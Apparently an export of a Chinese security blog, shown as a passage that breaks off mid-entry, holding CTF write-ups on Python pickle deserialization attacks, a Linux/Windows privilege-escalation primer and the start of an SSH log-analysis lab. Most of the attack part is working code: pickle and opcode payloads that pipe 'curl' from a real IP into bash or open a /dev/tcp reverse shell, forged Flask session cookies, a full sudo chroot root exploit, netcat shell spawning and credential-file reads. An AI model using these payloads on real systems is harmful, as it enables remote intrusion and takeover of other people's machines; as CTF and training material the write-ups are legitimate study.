__reduce__(self):        return(os.system,(&#x27;curl ip/1 |bash&#x27;,))a = aaa()payload=pickle.dumps(a)print(payload)&quot;&quot;&quot;b&#x27;\\x80\\x04\\x956\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x05posix\\x94\\x8c\\x06system\\x94\\x93\\x94\\x8c\\x1bcurl 47.122.131.175/2 |bash\\x94\\x85\\x94R\\x94.&#x27;&quot;&quot;&quot;\n\n伪造session\n根据上面提到的session格式,伪造session\n&#123;&#x27;notes&#x27;:&#123;&#x27;769b57ff-3d73-433a-811e-2bca92371c39&#x27;:b&#x27;\\x80\\x04\\x956\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x05posix\\x94\\x8c\\x06system\\x94\\x93\\x94\\x8c\\x1bcurl 47.122.131.175/2 |bash\\x94\\x85\\x94R\\x94.&#x27;&#125;&#125;\n\nflask-unsign --sign --cookie &quot;&#123;&#x27;notes&#x27;:&#123;&#x27;769b57ff-3d73-433a-811e-2bca92371c39&#x27;:b&#x27;\\x80\\x04\\x956\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x05posix\\x94\\x8c\\x06system\\x94\\x93\\x94\\x8c\\x1bcurl 47.122.131.175/2 |bash\\x94\\x85\\x94R\\x94.&#x27;&#125;&#125;&quot; --secret &quot;f991&quot;\n\n得到session\n.eJwtyk0LgjAYAOC_ErvvsL2rpdBBTURxRZki3XTqdIw6uL4U_3sEPednRre7bUfkzohvnHrNuw5DwwEzgApvCWkxrWXlUOBEgvN7qxq5SHlZcVDeXyD80n9KapiJX5EEMzVRYU1yzLVvdVMmY7w_QarDjxjYW0zhQ1wkSadYdVHSSzrk_fWcmYDt0LIsX5LELaA.aMJwgQ.0eQq7FtPDtVnOK5vI8uw-iWEcx8\n\n\n\n\n即可得到shell\n[HZNUCTF 2023 preliminary]pickleimport base64import picklefrom flask import Flask, requestapp = Flask(__name__)@app.route(&#x27;/&#x27;)def index():    with open(&#x27;app.py&#x27;, &#x27;r&#x27;) as f:        return f.read()@app.route(&#x27;/calc&#x27;, methods=[&#x27;GET&#x27;])def getFlag():    payload = request.args.get(&quot;payload&quot;)    pickle.loads(base64.b64decode(payload).replace(b&#x27;os&#x27;, b&#x27;&#x27;))    return &quot;ganbadie!&quot;@app.route(&#x27;/readFile&#x27;, methods=[&#x27;GET&#x27;])def readFile():    filename = request.args.get(&#x27;filename&#x27;).replace(&quot;flag&quot;, &quot;????&quot;)    with open(filename, &#x27;r&#x27;) as f:        return f.read()if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;)\n\n漏洞代码:\n@app.route(&#x27;/calc&#x27;, methods=[&#x27;GET&#x27;])def getFlag():    payload = request.args.get(&quot;payload&quot;)    pickle.loads(base64.b64decode(payload).replace(b&#x27;os&#x27;, b&#x27;&#x27;))    return &quot;ganbadie!&quot;\n\n拼接一下os即可,用没有os的payload\nimport pickleimport base64 class A(object):    def __reduce__(self):        return (eval, (&quot;__import__(&#x27;o&#x27;+&#x27;s&#x27;).popen(&#x27;curl 47.122.131.175/2 | bash&#x27;).read()&quot;,))    a = A()a = pickle.dumps(a)print(base64.b64encode(a))\n\n直接弹shell\n\nNSSCTF&#123;379bf252-10f4-404b-be5f-173b80e7d8b2&#125;\n\n基于opcode绕过字节码过滤对于一些题会对传入的数据进行过滤\n例如\n1.if b&#39;R&#39; in code or b&#39;built&#39; in code or b&#39;setstate&#39; in code or b&#39;flag&#39; in code\n2.a = base64.b64decode(session.get(&#39;ser_data&#39;)).replace(b&quot;builtin&quot;, b&quot;BuIltIn&quot;).replace(b&quot;os&quot;, b&quot;Os&quot;).replace(b&quot;bytes&quot;, b&quot;Bytes&quot;) if b&#39;R&#39; in a or b&#39;i&#39; in a or b&#39;o&#39; in a or b&#39;b&#39; in a:\n这个时候考虑用用到opcode\n什么是opcode\nPython 的 opcode（operation code）是一组原始指令，用于在 Python 解释器中执行字节码。每个 opcode都是是一个标识符，代表一种特定的操作或指令。 在 Python 中，源代码首先被编译为字节码，然后由解释器逐条执行字节码指令。这些指令以 opcode 的形式存储在字节码对象中，并由Python 解释器按顺序解释和执行。\n每个 opcode 都有其特定的功能，用于执行不同的操作，例如变量加载、函数调用、数值运算、控制流程等。Python 提供了大量的 opcode，以支持各种操作和语言特性。\n\nINST i、OBJ o、REDUCE R 都可以调用一个 callable 对象\n如何编写辅助生成工具pker：https://github.com/eddieivan01/pker\n一般用于绕过 find_class 黑名单&#x2F;白名单限制\npker用法\n\nGLOBAL 对应opcode：b’c’ 获取module下的一个全局对象（没有import的也可以，比如下面的os）： GLOBAL(‘os’, ‘system’) 输入：module,instance(callable、module都是instance)\nINST 对应opcode：b’i’ 建立并入栈一个对象（可以执行一个函数）： INST(‘os’, ‘system’, ’ls’)输入：module,callable,para\nOBJ 对应opcode：b’o’ 建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））： OBJ(GLOBAL(‘os’, ‘system’), ’ls’) 输入：callable,para\nxxx(xx,…) 对应opcode：b’R’ 使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）\nli[0]&#x3D;321 或 globals_dic[’local_var’]&#x3D;‘hello’ 对应opcode：b’s’ 更新列表或字典的某项的值\nxx.attr&#x3D;123 对应opcode：b’b’ 对xx对象进行属性设置\nreturn 对应opcode：b’0’ 出栈（作为pickle.loads函数的返回值）： return xxx # 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）\n\n对于做题而言会opache改写就行了\nINST i、OBJ o、REDUCE R 都可以调用一个 callable 对象\nRCE demo:R:b&#x27;&#x27;&#x27;cos\\nsystem\\n(S&#x27;whoami&#x27;\\ntR.&#x27;&#x27;&#x27;ib&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;\\nios\\nsystem\\n.&#x27;&#x27;&#x27;ob&#x27;&#x27;&#x27;(cos\\nsystem\\nS&#x27;whoami&#x27;\\no.&#x27;&#x27;&#x27;无R,i,o os可过b&#x27;&#x27;&#x27;(cos\\nsystem\\nS&#x27;calc&#x27;\\nos.&#x27;&#x27;&#x27;无R,i,o os 可过  + 关键词过滤b&#x27;&#x27;&#x27;(S&#x27;key1&#x27;\\nS&#x27;val1&#x27;\\ndS&#x27;vul&#x27;\\n(cos\\nsystem\\nVcalc\\nos.&#x27;&#x27;&#x27;V操作码是可以识别\\u (unicode编码绕过)特别是命令有特殊功能字符\n\n例题[MTCTF 2022]easypickleimport base64import picklefrom flask import Flask, sessionimport osimport randomapp = Flask(__name__)app.config[&#x27;SECRET_KEY&#x27;] = os.urandom(2).hex()@app.route(&#x27;/&#x27;)def hello_world():    if not session.get(&#x27;user&#x27;):        session[&#x27;user&#x27;] = &#x27;&#x27;.join(random.choices(&quot;admin&quot;, k=5))    return &#x27;Hello &#123;&#125;!&#x27;.format(session[&#x27;user&#x27;])@app.route(&#x27;/admin&#x27;)def admin():    if session.get(&#x27;user&#x27;) != &quot;admin&quot;:        return f&quot;&lt;script&gt;alert(&#x27;Access Denied&#x27;);window.location.href=&#x27;/&#x27;&lt;/script&gt;&quot;    else:        try:            a = base64.b64decode(session.get(&#x27;ser_data&#x27;)).replace(b&quot;builtin&quot;, b&quot;BuIltIn&quot;).replace(b&quot;os&quot;, b&quot;Os&quot;).replace(b&quot;bytes&quot;, b&quot;Bytes&quot;)            if b&#x27;R&#x27; in a or b&#x27;i&#x27; in a or b&#x27;o&#x27; in a or b&#x27;b&#x27; in a:                raise pickle.UnpicklingError(&quot;R i o b is forbidden&quot;)            pickle.loads(base64.b64decode(session.get(&#x27;ser_data&#x27;)))            return &quot;ok&quot;        except:            return &quot;error!&quot;if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;, port=8888)\n\n漏洞代码:\n@app.route(&#x27;/admin&#x27;)def admin():    if session.get(&#x27;user&#x27;) != &quot;admin&quot;:        return f&quot;&lt;script&gt;alert(&#x27;Access Denied&#x27;);window.location.href=&#x27;/&#x27;&lt;/script&gt;&quot;    else:        try:            a = base64.b64decode(session.get(&#x27;ser_data&#x27;)).replace(b&quot;builtin&quot;, b&quot;BuIltIn&quot;).replace(b&quot;os&quot;, b&quot;Os&quot;).replace(b&quot;bytes&quot;, b&quot;Bytes&quot;)            if b&#x27;R&#x27; in a or b&#x27;i&#x27; in a or b&#x27;o&#x27; in a or b&#x27;b&#x27; in a:                raise pickle.UnpicklingError(&quot;R i o b is forbidden&quot;)            pickle.loads(base64.b64decode(session.get(&#x27;ser_data&#x27;)))            return &quot;ok&quot;        except:            return &quot;error!&quot;\n\n这题的密钥还是一个弱口令,可以爆破\n绕过R i o b过滤其实仔细观察代码，发现其实最终使用的反序列化数据并不是经过replace之后的a，而是从session中获得的\n所以实际上我们经过replace之后的os还是小写的\n我们可以使用pickle构造os.system去反弹shell\nimport base64opcode = b&quot;&quot;&quot;(cossystemV\\u0062\\u0061\\u0073\\u0068\\u0020\\u002d\\u0063\\u0020\\u0027\\u0073\\u0068\\u0020\\u002d\\u0069\\u0020\\u003e\\u0026\\u0020\\u002f\\u0064\\u0065\\u0076\\u002f\\u0074\\u0063\\u0070\\u002f\\u0034\\u0037\\u002e\\u0031\\u0032\\u0032\\u002e\\u0031\\u0033\\u0031\\u002e\\u0031\\u0037\\u0035\\u002f\\u0032\\u0033\\u0033\\u0033\\u0020\\u0030\\u003e\\u0026\\u0031\\u0027os.&quot;&quot;&quot;print(base64.b64encode(opcode))&quot;&quot;&quot;b&#x27;KGNvcwpzeXN0ZW0KVlx1MDA2Mlx1MDA2MVx1MDA3M1x1MDA2OFx1MDAyMFx1MDAyZFx1MDA2M1x1MDAyMFx1MDAyN1x1MDA3M1x1MDA2OFx1MDAyMFx1MDAyZFx1MDA2OVx1MDAyMFx1MDAzZVx1MDAyNlx1MDAyMFx1MDAyZlx1MDA2NFx1MDA2NVx1MDA3Nlx1MDAyZlx1MDA3NFx1MDA2M1x1MDA3MFx1MDAyZlx1MDAzNFx1MDAzN1x1MDAyZVx1MDAzMVx1MDAzMlx1MDAzMlx1MDAyZVx1MDAzMVx1MDAzM1x1MDAzMVx1MDAyZVx1MDAzMVx1MDAzN1x1MDAzNVx1MDAyZlx1MDAzMlx1MDAzM1x1MDAzM1x1MDAzM1x1MDAyMFx1MDAzMFx1MDAzZVx1MDAyNlx1MDAzMVx1MDAyNwpvcy4K&#x27;&quot;&quot;&quot;\n\n本来我们opcode实际应该写为这样的：\nopcode = b&quot;&quot;&quot;(cossystemS&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;os.&quot;&quot;&quot;\n\n但是由于i被过滤了，所以我们需要进行绕过，我们可以使用V指令，V指令可以识别Unicode编码\n这样就可以将反弹shell进行unicode编码绕过\n\n生成解密脚本\nimport oswhile True:    secret_key=os.urandom(2).hex()    with open(&quot;/var/1.txt&quot;,&quot;a&quot;) as f:        f.write(secret_key+&#x27;\\n&#x27;)\n\n解密原始session\nflask-unsign --decode --cookie &quot;eyJ1c2VyIjoiZGRpZG0ifQ.aMKvSQ.YsCqPJ-V9t24NtfJjxsjOczpr88&quot;\n\n\n\n爆破密钥\nflask-unsign --unsign --cookie &quot;eyJ1c2VyIjoiZGRpZG0ifQ.aMKvSQ.YsCqPJ-V9t24NtfJjxsjOczpr88&quot; -w &quot;/var/1.txt&quot;  --no-literal-eval\n\n\n\n\n​\t找到密钥是95c9\n\n构造 payload\n构造类似的payload&#123;&#39;user&#39;:&#39;admin&#39;,&#39;ser_data&#39;:&#39;payload&#39;&#125;\n对替换后的 a 进行检查 R i o b 但是实际反序列化的是ser_data\n因此os中o可以存在，但是单独的o是被禁止的，因为os被替换成Os，但对后续ser_data不影响\n\n\n将前面的opcode base64一下\nb&#x27;KGNvcwpzeXN0ZW0KVlx1MDA2Mlx1MDA2MVx1MDA3M1x1MDA2OFx1MDAyMFx1MDAyZFx1MDA2M1x1MDAyMFx1MDAyN1x1MDA3M1x1MDA2OFx1MDAyMFx1MDAyZFx1MDA2OVx1MDAyMFx1MDAzZVx1MDAyNlx1MDAyMFx1MDAyZlx1MDA2NFx1MDA2NVx1MDA3Nlx1MDAyZlx1MDA3NFx1MDA2M1x1MDA3MFx1MDAyZlx1MDAzNFx1MDAzN1x1MDAyZVx1MDAzMVx1MDAzMlx1MDAzMlx1MDAyZVx1MDAzMVx1MDAzM1x1MDAzMVx1MDAyZVx1MDAzMVx1MDAzN1x1MDAzNVx1MDAyZlx1MDAzMlx1MDAzM1x1MDAzM1x1MDAzM1x1MDAyMFx1MDAzMFx1MDAzZVx1MDAyNlx1MDAzMVx1MDAyNwpvcy4K&#x27;\n\n\n伪造session如下:\n&#123;&#x27;user&#x27;:&#x27;admin&#x27;,&#x27;ser_data&#x27;:&#x27;KGNvcwpzeXN0ZW0KVlx1MDA2Mlx1MDA2MVx1MDA3M1x1MDA2OFx1MDAyMFx1MDAyZFx1MDA2M1x1MDAyMFx1MDAyN1x1MDA3M1x1MDA2OFx1MDAyMFx1MDAyZFx1MDA2OVx1MDAyMFx1MDAzZVx1MDAyNlx1MDAyMFx1MDAyZlx1MDA2NFx1MDA2NVx1MDA3Nlx1MDAyZlx1MDA3NFx1MDA2M1x1MDA3MFx1MDAyZlx1MDAzNFx1MDAzN1x1MDAyZVx1MDAzMVx1MDAzMlx1MDAzMlx1MDAyZVx1MDAzMVx1MDAzM1x1MDAzMVx1MDAyZVx1MDAzMVx1MDAzN1x1MDAzNVx1MDAyZlx1MDAzMlx1MDAzM1x1MDAzM1x1MDAzM1x1MDAyMFx1MDAzMFx1MDAzZVx1MDAyNlx1MDAzMVx1MDAyNwpvcy4K&#x27;&#125;\n\nsession签名:\nflask-unsign --sign --cookie &#123;&#x27;user&#x27;:&#x27;admin&#x27;,&#x27;ser_data&#x27;:&#x27;KGNvcwpzeXN0ZW0KVlx1MDA2Mlx1MDA2MVx1MDA3M1x1MDA2OFx1MDAyMFx1MDAyZFx1MDA2M1x1MDAyMFx1MDAyN1x1MDA3M1x1MDA2OFx1MDAyMFx1MDAyZFx1MDA2OVx1MDAyMFx1MDAzZVx1MDAyNlx1MDAyMFx1MDAyZlx1MDA2NFx1MDA2NVx1MDA3Nlx1MDAyZlx1MDA3NFx1MDA2M1x1MDA3MFx1MDAyZlx1MDAzNFx1MDAzN1x1MDAyZVx1MDAzMVx1MDAzMlx1MDAzMlx1MDAyZVx1MDAzMVx1MDAzM1x1MDAzMVx1MDAyZVx1MDAzMVx1MDAzN1x1MDAzNVx1MDAyZlx1MDAzMlx1MDAzM1x1MDAzM1x1MDAzM1x1MDAyMFx1MDAzMFx1MDAzZVx1MDAyNlx1MDAzMVx1MDAyNwpvcy4K&#x27;&#125; --secret 95c9\n\n得到\n.eJyrViotTi1SslJKTMnNzFPSUQLy4lMSSxKBQt7ufmXJ5QVVqRF-BlHhBt5hORWGvi6ORr4wOgxMG_saQvj-bmC60hdKR7lB1RmiivsZEqfPPwxFvCoKyvfLQVMPdY8fVJ8f1F0wdVB5Yz9U9xij6a-CyldB3VcJta_KF0bnoNCY8oYofAx5qLlVfmGo9sLNNcRKw_2PIxzg9vmVF5QlV5p4K9UCAPj_lEc.aMK5Ig.iWElfcilB7JypeNTDXdbahkQpzo\n\n改cookie,弹shell\n\n\n\nNSSCTF&#123;5b06a3c8-2698-438e-9672-7eb32edefa53&#125;\n","categories":["python,pickle"],"tags":["python,pickle,反序列化"]},{"title":"提权_基础篇","url":"/2025/10/09/%E6%8F%90%E6%9D%83-%E5%9F%BA%E7%A1%80%E7%AF%87/","content":"WindowsNT的权限划分\nAdministrators：管理员组，一般情况下这个组的的用户对计算机&#x2F;域有不受限制的完全访问权\nPower Users：高级用户组,Power Users 可以执行除了为 Administrators 组保留的任务外的其他任何操作系统任务。\nUsers：普通用户组,这个组的用户无法进行有意或无意的改动。\nGuests：来宾组,来宾跟普通Users的成员有同等访问权，但来宾帐户的限制更多\nEveryone：所有的用户，这个计算机上的所有用户都属于这个组。\n\nLinux下的权限划分在linux系统中，用户是分角色的，角色不同，所对应的权限也就不同。用户角色通过UID和GID识别。一个UID是唯一标识一个系统角色的账号。\n\n超级用户(0)：默认是root用户，其UID和GID都是0。root用户在每台Unix和Linux系统中都是唯一且真是存在的，通过它可以登陆系统，操作系统中任何文件执行系统中任何命令，拥有最高管理权限。\n\n普通用户(1~499)：系统中大多数用户都是普通用户，实际中也一般使用普通用户操作，需要权限是用sudo命令提升权限。\n\n虚拟用户(500~65535)：与真实的普通用户区分开来，这类用户最大特点是安装系统后默认就会存在，且默认情况大多数不能登陆系统，其在/etc/passwd文件中，最后字段为/sbin/nologin。是系统正常运行不可缺少的，主要是方便系统管理，满足相应的系统进程对文件属主的要求\n\n\nWindows基础命令\nwhoami\n和linux中的一样，查看当前用户权限\n\n\nsysteminfo\n查看当前系统版本与补丁信息（利用系统较老，没有打对应补丁来进行提权）\n\n\nver\n查看当前服务器操作系统版本\n\n\nNet start\n查看当前计算机开启服务名称\n\n\nnet user username(用户名) password(密码) /add，net localgroup adminstrators username /add\n先添加一个普通用户，再把这个用户添加到管理员用户的组中\n\nnetstat -ano\n查看端口情况\n\n\ntasklist\n查看所有进程占用的端口\n\n\n\nLinux基础命令内核，操作系统，设备信息uname -a    打印所有可用的系统信息uname -r    内核版本uname -n    系统主机名。uname -m    查看系统内核架构（64位/32位）hostname    系统主机名cat /proc/version    内核信息cat /etc/*-release   分发信息cat /etc/issue       分发信息cat /proc/cpuinfo    CPU信息cat /etc/lsb-release # Debian cat /etc/redhat-release # Redhatls /boot | grep vmlinuz-\n\n\n利用/proc/version可以目标系统信息（和uname -a类似）\n\nhostname命令可以查看主机名，通常可以提供关于主机在域中的角色信息\n\n用户和群组cat /etc/passwd     列出系统上的所有用户cat /var/mail/rootcat /var/spool/mail/rootcat /etc/group      列出系统上的所有组grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#x27;$3 == 0 &#123; print $1&#125;&#x27;      列出所有的超级用户账户whoami              查看当前用户w                   谁目前已登录，他们正在做什么last                最后登录用户的列表lastlog             所有用户上次登录的信息lastlog –u %username%  有关指定用户上次登录的信息lastlog |grep -v &quot;Never&quot;  以前登录用户的完\n\n/etc/passwd文件内显示了所有系统用户，在系统中被使用的用户可以在/home中找到\n\n用户权限信息whoami        当前用户名id            当前用户信息cat /etc/sudoers  谁被允许以root身份执行sudo -l       当前用户可以以root身份执行操作\n\n环境信息env        显示环境变量set        设置set的执行方式$PATH 路径信息history    显示当前用户的历史命令记录pwd        输出工作目录cat /etc/profile   显示默认系统变量cat /etc/shells    显示可用的shellrccat /etc/bashrccat ~/.bash_profilecat ~/.bashrccat ~/.bash_logout\n\nenv命令显示环境变量\n\nhistory命令可以查看当前终端的历史执行命令\n\nPATH变量通常可以看到编译器或者脚本语言的信息\n进程和服务ps auxps -eftopcat /etc/services查看以root 运行的进程：ps aux | grep rootps -ef | grep root\n\nps命令通常被用来查看系统运行的进程。\n\n（进程状态）的输出\n将显示以下内容；\n\nPID：进程ID（进程唯一）\nTTY：用户使用的终端类型\n时间：进程使用的 CPU 时间量（这不是该进程运行的时间）\nCMD：正在运行的命令或可执行文件（不会显示任何命令行参数）\n\n\n\n查看安装的软件ls -alh /usr/bin/ls -alh /sbin/ls -alh /var/cache/yum/dpkg -l\n\n服务&#x2F;插件检查有没有不安全的服务配置，和一些有漏洞的插件。\ncat /etc/syslog.confcat /etc/chttp.confcat /etc/lighttpd.confcat /etc/cups/cupsd.confcat /etc/inetd.confcat /etc/apache2/apache2.confcat /etc/my.confcat /etc/httpd/conf/httpd.confcat /opt/lampp/etc/httpd.confls -aRl /etc/ | awk &#x27;$1 ~ /^.*r.*/\n\n计划任务crontab -lls -alh /var/spool/cronls -al /etc/ | grep cronls -al /etc/cron*cat /etc/cron*cat /etc/at.allowcat /etc/at.denycat /etc/cron.allowcat /etc/cron.denycat /etc/crontabcat /etc/anacrontabcat /var/spool/cron/crontabs/root\n\n有无明文存放用户密码grep -i user [filename]grep -i pass [filename]grep -C 5 &quot;password&quot; [filename]find , -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;\n\n查看与当前机器通信的其他用户或者主机lsof -ilsof -i :80grep 80 /etc/servicesnetstat -antupnetstat -antpxnetstat -tulpnchkconfig --listchkconfig --list | grep 3:onlastw\n\nnetstat可以查看现有的连接信息\n\n利用netstat -at和netstat -au可以分别显示tcp和udp协议的连接\n利用netstat -l可以以Listen列出端口\n\n\n日志文件cat /var/log/boot.logcat /var/log/croncat /var/log/syslogcat /var/log/wtmpcat /var/run/utmpcat /etc/httpd/logs/access_logcat /etc/httpd/logs/access.logcat /etc/httpd/logs/error_logcat /etc/httpd/logs/error.logcat /var/log/apache2/access_logcat /var/log/apache2/access.logcat /var/log/apache2/error_logcat /var/log/apache2/error.logcat /var/log/apache/access_logcat /var/log/apache/access.logcat /var/log/auth.logcat /var/log/chttp.logcat /var/log/cups/error_logcat /var/log/dpkg.logcat /var/log/faillogcat /var/log/httpd/access_logcat /var/log/httpd/access.logcat /var/log/httpd/error_logcat /var/log/httpd/error.logcat /var/log/lastlogcat /var/log/lighttpd/access.logcat /var/log/lighttpd/error.logcat /var/log/lighttpd/lighttpd.access.logcat /var/log/lighttpd/lighttpd.error.logcat /var/log/messagescat /var/log/securecat /var/log/syslogcat /var/log/wtmpcat /var/log/xferlogcat /var/log/yum.logcat /var/run/utmpcat /var/webmin/miniserv.logcat /var/www/logs/access_logcat /var/www/logs/access.logls -alh /var/lib/dhcp3/ls -alh /var/log/postgresql/ls -alh /var/log/proftpd/ls -alh /var/log/samba/Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp\n\n交互式shellpython -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;echo os.system(&#x27;/bin/bash&#x27;)/bin/sh -i\n\n可提权SUID &amp;&amp; GUIDfind / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUIDfor i in `locate -r &quot;bin$&quot;`; do find $i \\( -perm -4000 -o -perm -2000 \\) -type f 2&gt;/dev/null; done    # Looks in &#x27;common&#x27; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld &#123;&#125; \\; 2&gt;/dev/null\n\n查看可写&#x2F;执行目录find / -writable -type d 2&gt;/dev/null      # world-writeable foldersfind / -perm -222 -type d 2&gt;/dev/null     # world-writeable foldersfind / -perm -o w -type d 2&gt;/dev/null     # world-writeable foldersfind / -perm -o x -type d 2&gt;/dev/null     # world-executable foldersfind / \\( -perm -o w -perm -o x \\) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders\n\nLinux提权方法sudo chwootCVE-2025-32463：影响版本1.9.14 &lt;&#x3D; sudo &lt;&#x3D; 1.9.17\n在靶机中运行此sh脚本即可获取root权限(运行的时候把代码旁边的注释去掉)\n#!/bin/bash# sudo-chwoot.sh# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch#                  @ Stratascale Cyber Research Unit (CRU)STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)             cd $&#123;STAGE?&#125; || exit 1                                    cat &gt; woot1337.c&lt;&lt;EOF                                     #include &lt;stdlib.h&gt;   #include &lt;unistd.h&gt;__attribute__((constructor)) void woot(void) &#123;  setreuid(0,0);                                            setregid(0,0);  chdir(&quot;/&quot;);                                              execl(&quot;/bin/bash&quot;, &quot;/bin/bash&quot;, NULL);                  &#125;EOFmkdir -p woot/etc libnss_echo &quot;passwd: /woot1337&quot; &gt; woot/etc/nsswitch.confcp /etc/group woot/etcgcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.cecho &quot;woot!&quot;sudo -R woot wootrm -rf $&#123;STAGE?&#125;\n\nSUID 提权什么是suid提权\nsuid全称是Set owner User ID up on execution。这是Linux给可执行文件的一个属性。通俗的理解为其他用户执行这个程序的时候可以用该程序所有者&#x2F;组的权限。需要注意的是，只有程序的所有者是0号或其他super user，同时拥有suid权限，才可以提权。\n常见的可用来提权的Linux 可执行文件有：Nmap, Vim, find, bash, more, less, nano, cp\n查看可以suid 提权的可执行文件\nfind / -perm -u=s -type f 2&gt;/dev/null\n\n\nfind实用程序find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行(对系统版本有要求)\n比如：DC -1 靶机就是利用find 命令进行root 用户来执行命令\n\n大部分Linux 系统都安装了nc。使用find aaa - exec netcat -lvp 5555 -e /bin/sh \\; 即可成功反弹root shell\nnmap早期nmap 具有交互模式，version 2.02～5.21（5.2.0）。\nnmap --interactive!sh\n\n\n漏洞检测工具Metasploit就存在利用 SUID nmap 提权的exp，这里不细讲\n在nmap5.2.0之后，nmap还可以通过执行脚本来提权\necho &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; getshellsudo nmap --script=getshell\n\n参考DC 6 靶机:https://hack-for.fun/posts/8886.html#%E6%8F%90%E6%9D%83\nvim如果vim 是通过SUID运行，就会继承root用户的权限。可读取只有root能读取的文件。\nvim /etc/passwd\n\nvim 运行shell:\nvim:set shell=/bin/sh:shell\n\n同理，满足条件的less和more也能提权\n###利用内核漏洞\n比如DC 3 靶机，就是利用系统内核漏洞来进行提权\n在kali中获取exp:\nsearchsploit Ubuntu 16.04\n\n\n根据说明文件，按照以下步骤一步步运行\nwget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip -O 39772.zipunzip 39772.ziptar xvf 39772/exploit.tarsudo apt install libfuse-dev pkg-config gcc makecd ebpf_mapfd_doubleput_exploitchmod +x compile.sh./compile.sh./doubleput\n\n还有大名鼎鼎的CVE-2016-5195，脏牛漏洞\nexp链接：https://github.com/FireFart/dirtycow\n\n将exp下载到本地\nwget https://github.com/FireFart/dirtycow\n\n使用gcc -pthread dirty.c -o dirty -lcrypt命令对dirty.c进行编译，生成一个dirty的可执行文件。\n\n\n\n\n执行./dirty 密码命令，即可进行提权\n\n\n使用提供的账号密码即可提权\nsu firefart\n\n其他内核漏洞：\nLinux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04&#x2F;14.04&#x2F;14.10&#x2F;15.04) – ‘overlayfs’ Local Root Shell\nhttps://www.exploit-db.com/exploits/37292/\nLinux Kernel 4.3.3 (Ubuntu 14.04&#x2F;15.10) – ‘overlayfs’ Local Root Exploit\nhttps://www.exploit-db.com/exploits/39166/\nLinux Kernel 4.3.3 – ‘overlayfs’ Local Privilege Escalation\nhttps://www.exploit-db.com/exploits/39230/\n\n提示：内核exploit提权有风险，有可能会崩溃系统。\n\n利用root无密码执行","categories":["提权"],"tags":["提权"]},{"title":"玄机应急相应","url":"/2025/10/09/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E7%9B%B8%E5%BA%94/","content":"玄机应急响应第一章 应急响应-Linux日志分析账号root密码linuxrzssh root@IP1.有多少IP在爆破主机ssh的root帐号，如果有多个使用&quot;,&quot;分割2.ssh爆破成功登陆的IP是多少，如果有多个使用&quot;,&quot;分割3.爆破用户名字典是什么？如果有多个使用&quot;,&quot;分割4.登陆成功的IP共爆破了多少次5.黑客登陆主机后新建了一个后门用户，用户名是多少\n\n一般ssh登录日志存放在&#x2F;var&#x2F;log&#x2F;auth.log下,也可用find -name 查询日志所在目录\nAug  1 07:40:47 linux-rz sshd[7461]: Invalid user test1 from 192.168.200.35 port 33874Aug  1 07:40:48 linux-rz sshd[7461]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:40:48 linux-rz sshd[7461]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.35 Aug  1 07:40:50 linux-rz sshd[7461]: Failed password for invalid user test1 from 192.168.200.35 port 33874 ssh2Aug  1 07:40:52 linux-rz sshd[7461]: Connection closed by invalid user test1 192.168.200.35 port 33874 [preauth]Aug  1 07:40:58 linux-rz sshd[7465]: Invalid user test2 from 192.168.200.35 port 51640Aug  1 07:41:01 linux-rz sshd[7465]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:41:01 linux-rz sshd[7465]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.35 Aug  1 07:41:04 linux-rz sshd[7465]: Failed password for invalid user test2 from 192.168.200.35 port 51640 ssh2Aug  1 07:41:07 linux-rz sshd[7465]: Connection closed by invalid user test2 192.168.200.35 port 51640 [preauth]Aug  1 07:41:09 linux-rz sshd[7468]: Invalid user test3 from 192.168.200.35 port 48168Aug  1 07:41:11 linux-rz sshd[7468]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:41:11 linux-rz sshd[7468]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.35 Aug  1 07:41:13 linux-rz sshd[7468]: Failed password for invalid user test3 from 192.168.200.35 port 48168 ssh2Aug  1 07:41:19 linux-rz sshd[7468]: Connection closed by invalid user test3 192.168.200.35 port 48168 [preauth]Aug  1 07:42:30 linux-rz sshd[7471]: pam_unix(sshd:auth): authentication failure; 